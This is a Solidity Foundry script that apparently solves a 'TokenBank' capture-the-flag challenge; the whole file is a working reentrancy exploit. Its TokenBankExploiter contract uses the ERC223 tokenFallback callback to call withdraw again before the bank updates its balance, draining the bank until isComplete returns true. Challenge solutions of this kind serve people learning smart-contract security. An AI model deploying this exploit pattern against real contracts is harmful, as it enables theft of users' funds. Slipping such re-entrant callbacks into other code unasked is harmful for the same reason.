// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";

interface ISimpleERC223Token {
    function transfer(address to, uint256 value) external returns (bool success);
}

interface ITokenBank {
    function token() external view returns (ISimpleERC223Token);

    function isComplete() external view returns (bool);

    function withdraw(uint256 amount) external;
}

contract TokenBankSolution is Script {
    ITokenBank private tokenBank = ITokenBank(vm.envAddress("ADDRESS"));
    uint256 private constant HALF_AMOUNT = 500000 * 10 ** 18;

    function setUp() public {}

    function run() public {
        vm.startBroadcast();
        tokenBank.withdraw(HALF_AMOUNT);
        TokenBankExploiter exploiter = new TokenBankExploiter(
            address(tokenBank)
        );
        tokenBank.token().transfer(address(exploiter), HALF_AMOUNT);
        exploiter.exploit();
        vm.stopBroadcast();
        require(tokenBank.isComplete());
    }
}

contract TokenBankExploiter {
    uint256 private constant HALF_AMOUNT = 500000 * 10 ** 18;
    address public owner;
    ITokenBank public tokenBank;
    ISimpleERC223Token public token;

    constructor(address _address) public {
        owner = msg.sender;
        tokenBank = ITokenBank(_address);
        token = tokenBank.token();
    }

    function exploit() public {
        require(msg.sender == owner);
        tokenBank.withdraw(HALF_AMOUNT);
        require(tokenBank.isComplete());
    }

    function tokenFallback(address from, uint256 value, bytes memory data) public {
        require(msg.sender == address(token));
        if (from == owner) {
            token.transfer(address(tokenBank), HALF_AMOUNT);
        }

        if (from == address(tokenBank) && !tokenBank.isComplete()) {
            tokenBank.withdraw(HALF_AMOUNT);
        }
    }
}
